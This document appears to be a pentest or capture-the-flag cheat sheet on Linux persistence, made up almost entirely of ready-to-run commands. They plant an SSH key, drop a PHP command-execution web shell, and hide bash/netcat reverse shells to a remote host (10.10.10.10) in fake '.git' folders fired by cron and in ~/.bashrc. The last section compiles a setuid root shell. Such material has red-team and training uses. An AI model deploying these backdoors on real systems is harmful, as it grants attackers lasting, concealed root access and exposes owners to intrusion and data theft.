# Linux Persistence
## Linux Persistance 
### SSH Key
- Can be root or normal user.
````
echo "SSH_PUB_KEY_HERE" > ~/.ssh/authorized_keys
````
## PHP Backdoors
- Most likely need to be root, depends on if apache2 is already running, as well as web root permissions for your current user.
- On victim machine
````
sudo systemctl start apache2
cd /var/www/html 
nano ANKWTxiy11ugLHdaxJ.php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
````
### Usage
````
http://target.com/ANKWTxiy11ugLHdaxJ.php?cmd=cat+/etc/passwd
````
## Cron Job Backdoor
- On target if root
````
mkdir /usr/lib/.git 
cd /usr/lib/.git
echo '#!/bin/bash 
bash -i >& /dev/tcp/10.10.10.10/443 0>&1 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f' > .git 
chmod +x .git 
````
- On target it not root
````
mkdir /var/tmp/.git 
cd /var/tmp/.git
echo '#!/bin/bash 
bash -i >& /dev/tcp/10.10.10.10/443 0>&1 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f' > .git 
chmod +x .git
````
- Create the cron Job
````
crontab -e
* * * * * /bin/bash -c /usr/lib/.git/.git 
* * * * * /bin/bash -c /var/tmp/.git/.git
````
## Bashrc Backdoor
- Can be used as the root or non root user
````
cd ~
echo 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f' >> ~/.bashrc
tail ~/.bashrc
````

## SUID Binary
- Need to be root, great backdoor if for example you found a priv-esc as a normal user and want an ability to priv-esc up in the future
- Depends on having `gcc` on the target
````
which gcc 
echo 'int main() { setresuid(0,0,0); system("/bin/sh"); }' > boot.c
gcc -o boot boot.c
rm boot.c
chmod u+s boot
````
- To trigger 
````
./boot
````







